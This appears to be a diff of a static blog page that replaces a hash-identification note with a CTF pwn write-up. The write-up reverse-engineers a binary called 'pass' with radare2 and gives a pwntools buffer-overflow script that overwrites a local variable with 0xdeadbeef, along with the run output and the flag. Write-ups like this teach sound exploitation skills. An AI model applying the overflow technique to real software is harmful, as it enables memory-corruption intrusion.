@@ -16,22 +16,28 @@
   <meta name="author" content="Xiung">
   <meta name="keywords" content="">
   
-    <meta name="description" content="基本步驟： 如果要破解hash的話，要先判斷是哪種hash a. 可以利用網路資源-Hashes.com b. 或是使用python工具-hashid hashid.py 使用方式 可直接 python3 hash-id.py輸入 也可以 cat hash.txt | hash-identifier 這種方式輸入   c. 也可以自己用比對(Ctrl-f)的方式： hash表">
+    <meta name="description" content="use file &lt;file&gt; to take a look. It’s ELF file.  1234$ file passpass: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter &#x2F;lib64&#x2F;ld-linux-x86-64.so.2, BuildID[sh">
 <meta property="og:type" content="article">
-<meta property="og:title" content="John The Ripper">
-<meta property="og:url" content="http://example.com/2021/08/06/John-The-Ripper/index.html">
+<meta property="og:title" content="pass">
+<meta property="og:url" content="http://example.com/2022/01/10/pass/index.html">
 <meta property="og:site_name" content="Xiung&#39;s Blog">
-<meta property="og:description" content="基本步驟： 如果要破解hash的話，要先判斷是哪種hash a. 可以利用網路資源-Hashes.com b. 或是使用python工具-hashid hashid.py 使用方式 可直接 python3 hash-id.py輸入 也可以 cat hash.txt | hash-identifier 這種方式輸入   c. 也可以自己用比對(Ctrl-f)的方式： hash表">
+<meta property="og:description" content="use file &lt;file&gt; to take a look. It’s ELF file.  1234$ file passpass: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter &#x2F;lib64&#x2F;ld-linux-x86-64.so.2, BuildID[sh">
 <meta property="og:locale" content="en_US">
-<meta property="article:published_time" content="2021-08-06T14:14:12.000Z">
-<meta property="article:modified_time" content="2022-10-02T09:19:17.485Z">
+<meta property="og:image" content="https://user-images.githubusercontent.com/66505819/139246455-3a32ff1c-f05b-4d58-b7a5-2976cc7d66b0.png">
+<meta property="og:image" content="https://user-images.githubusercontent.com/66505819/139246670-c5619595-d225-4ea8-89e0-e1752fe65339.png">
+<meta property="og:image" content="https://user-images.githubusercontent.com/66505819/139246794-227723d7-fe4c-4f59-92e5-b6c59ef32075.png">
+<meta property="article:published_time" content="2022-01-09T18:56:59.000Z">
+<meta property="article:modified_time" content="2022-10-02T09:43:40.942Z">
 <meta property="article:author" content="Xiung">
 <meta property="article:tag" content="CyberSecurity">
+<meta property="article:tag" content="PWN">
+<meta property="article:tag" content="CTF">
 <meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://user-images.githubusercontent.com/66505819/139246455-3a32ff1c-f05b-4d58-b7a5-2976cc7d66b0.png">
   
   
   
-  <title>John The Ripper - Xiung&#39;s Blog</title>
+  <title>pass - Xiung&#39;s Blog</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -196,7 +202,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="John The Ripper"></span>
+            <span id="subtitle" data-typed-text="pass"></span>
           
         </div>
 
@@ -207,8 +213,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2021-08-06 22:14" pubdate>
-          August 6, 2021 pm
+        <time datetime="2022-01-10 02:56" pubdate>
+          January 10, 2022 am
         </time>
       </span>
     
@@ -219,7 +225,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          168 words
+          1.4k words
         
       </span>
     
@@ -230,7 +236,7 @@
         
         
         
-          2 mins
+          12 mins
         
       </span>
     
@@ -268,16 +274,29 @@
         <div id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">John The Ripper</h1>
+            <h1 style="display: none">pass</h1>
             
             
               <div class="markdown-body">
                 
-                <h1 id="基本步驟："><a href="#基本步驟：" class="headerlink" title="基本步驟："></a>基本步驟：</h1><ol>
-<li>如果要破解hash的話，要先判斷是哪種hash<br> a. 可以利用網路資源-<a target="_blank" rel="noopener" href="https://hashes.com/en/tools/hash_identifier">Hashes.com</a><br> b. 或是使用python工具-<a target="_blank" rel="noopener" href="https://pypi.org/project/hashID/">hashid</a><blockquote>
-<p>hashid.py 使用方式<br> 可直接 <code>python3 hash-id.py</code>輸入<br> 也可以 <code>cat hash.txt | hash-identifier</code> 這種方式輸入</p>
-</blockquote>
-<p> c. 也可以自己用比對(<code>Ctrl-f</code>)的方式：<br> <a target="_blank" rel="noopener" href="https://hashcat.net/wiki/doku.php?id=example_hashes" title="hashcat.net">hash表</a></p>
+                <ol>
+<li>use <code>file &lt;file&gt;</code> to take a look. It’s ELF file.</li>
+</ol>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs vim">$ <span class="hljs-keyword">file</span> pass<br>pass: ELF <span class="hljs-number">64</span>-bit LSB <span class="hljs-built_in">executable</span>, x86-<span class="hljs-number">64</span>, <span class="hljs-keyword">version</span> <span class="hljs-number">1</span> (SYSV), dynamically linked, <br>interpreter /lib64/ld-linux-x86-<span class="hljs-number">64</span>.<span class="hljs-keyword">so</span>.<span class="hljs-number">2</span>, BuildID[sha1]=abcfeb57f2bcc8ad99fcba05bb6a05830c5e36d0, <br><span class="hljs-keyword">for</span> GNU/Linux <span class="hljs-number">3.2</span>.<span class="hljs-number">0</span>, not stripped<br></code></pre></td></tr></table></figure>
+
+<ol start="2">
+<li><p>use <code>r2 &lt;executable file&gt;</code> to see the flow of the program.<br>  a. <code>aa</code>, <code>afl</code> to see the function of the binary.<br>  b. <code>s &lt;function&gt;</code> seek to the function.<br>  b. <code>VV</code> to see the function(we just set) flow in a graphic way.</p>
+</li>
+<li><p>by r2 VV command, we can see that var_20h is put at rbp-0x20, var_4h is at rbp-0x4.<br><img src="https://user-images.githubusercontent.com/66505819/139246455-3a32ff1c-f05b-4d58-b7a5-2976cc7d66b0.png" srcset="/img/loading.gif" lazyload alt="image"></p>
+</li>
+<li><p>keep looking, we find that the program store number 1234(0x4d2) at var_4h. And the program will compare it with 0xdeadbeef.<br>if they are the same, program jump to Door open and we’ll find the flag, or we fail.<br><img src="https://user-images.githubusercontent.com/66505819/139246670-c5619595-d225-4ea8-89e0-e1752fe65339.png" srcset="/img/loading.gif" lazyload alt="image"><br><img src="https://user-images.githubusercontent.com/66505819/139246794-227723d7-fe4c-4f59-92e5-b6c59ef32075.png" srcset="/img/loading.gif" lazyload alt="image"></p>
+</li>
+<li><p>Our input will be put at var_20h, and we need to change the data that store at var_4h, using boffer overflow. So, we have the script below.</p>
+<figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs clean"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>r = process(<span class="hljs-string">&#x27;./pass&#x27;</span>)<br>#r = remote(<span class="hljs-string">&#x27;120.114.62.211&#x27;</span>, <span class="hljs-number">6126</span>)<br><br>payload = b<span class="hljs-string">&#x27;A&#x27;</span>*<span class="hljs-number">28</span><br><br>r.sendline(payload + p64(<span class="hljs-number">0xdeadbeef</span>))  #<span class="hljs-keyword">if</span> <span class="hljs-number">64</span> bit ,or <span class="hljs-number">32</span>bit use p32<br><br>r.interactive()<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>run the script and get the flag.</p>
+<figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs gauss">$ python3 exploit.py<br>[+] Starting <span class="hljs-keyword">local</span> process &#x27;./pass&#x27;: pid <span class="hljs-number">162</span><br>[*] Switching to interactive mode<br>Billy left his <span class="hljs-built_in">key</span> in the locked room.<br>However, he forgot the <span class="hljs-built_in">token</span> of the room.<br><span class="hljs-keyword">Do</span> you know what&#x27;s the <span class="hljs-built_in">key</span>?Door <span class="hljs-keyword">open</span>. OwO<br>FLAG&#123;xtnntfhzflpttvxvzzbfjfnxbjvrzxdfvzlvhpt&#125;<br>hello hacker!<br>[*] Process &#x27;./pass&#x27; stopped with exit <span class="hljs-built_in">code</span> <span class="hljs-number">0</span> (pid <span class="hljs-number">162</span>)<br>[*] Got <span class="hljs-built_in">EOF</span> <span class="hljs-keyword">while</span> reading in interactive<br>$<br></code></pre></td></tr></table></figure>
+<p>the flag is: FLAG{xtnntfhzflpttvxvzzbfjfnxbjvrzxdfvzlvhpt}</p>
 </li>
 </ol>
 
@@ -298,7 +317,7 @@
     
       <span class="category-chain">
         
-  <a href="/categories/Learning-Note/" class="category-chain-item">Learning Note</a>
+  <a href="/categories/Write-up/" class="category-chain-item">Write-up</a>
   
   
 
@@ -315,6 +334,10 @@
       
         <a href="/tags/CyberSecurity/">#CyberSecurity</a>
       
+        <a href="/tags/PWN/">#PWN</a>
+      
+        <a href="/tags/CTF/">#CTF</a>
+      
     </div>
   
 </div>
@@ -325,8 +348,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>John The Ripper</div>
-      <div>http://example.com/2021/08/06/John-The-Ripper/</div>
+      <div>pass</div>
+      <div>http://example.com/2022/01/10/pass/</div>
     </div>
     <div class="license-meta">
       
@@ -338,7 +361,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>Posted on</div>
-          <div>August 6, 2021</div>
+          <div>January 10, 2022</div>
         </div>
       
       
@@ -370,9 +393,9 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2021/11/01/gohome/" title="gohome">
+                      <a href="/2022/01/12/split/" title="split">
                         <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">gohome</span>
+                        <span class="hidden-mobile">split</span>
                         <span class="visible-mobile">Previous</span>
                       </a>
                     
@@ -380,8 +403,8 @@
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2021/07/02/WSL2-Kali-%E4%BD%BF%E7%94%A8-msf-%E8%B3%87%E6%96%99%E5%BA%AB%E7%9A%84%E9%8C%AF%E8%AA%A4%E8%A7%A3%E6%B1%BA/" title="WSL2-Kali 使用 msf 資料庫的錯誤解決">
-                        <span class="hidden-mobile">WSL2-Kali 使用 msf 資料庫的錯誤解決</span>
+                      <a href="/2021/11/16/Algo-Greedy/" title="Algo-Greedy">
+                        <span class="hidden-mobile">Algo-Greedy</span>
                         <span class="visible-mobile">Next</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
